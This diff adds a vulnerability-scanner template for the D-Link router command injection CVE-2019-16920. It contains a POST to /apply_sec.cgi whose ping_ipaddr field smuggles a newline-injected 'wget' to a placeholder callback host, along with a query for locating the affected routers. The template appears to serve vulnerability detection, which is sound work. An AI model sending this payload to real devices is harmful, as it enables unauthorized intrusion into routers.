@@ -1,0 +1,27 @@
+name: Dlink RCE CVE-2019-16920
+manual: true
+query: (app="D_Link-Router" | body="DIR-655" | body="DIR-866L" | body="DIR-652" |
+  body="DHP-1565")
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /apply_sec.cgi
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://{{check}}
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://www.anquanke.com/post/id/187923
+  description: 'Unauthenticated remote code execution occurs in D-Link products such
+    as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker
+    sends an arbitrary input to a "PingTest" device common gateway interface that
+    could lead to common injection. An attacker who successfully triggers the command
+    injection could achieve full system compromise. Later, it was independently found
+    that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835,
+    and DIR-825.'
+  tags: rce
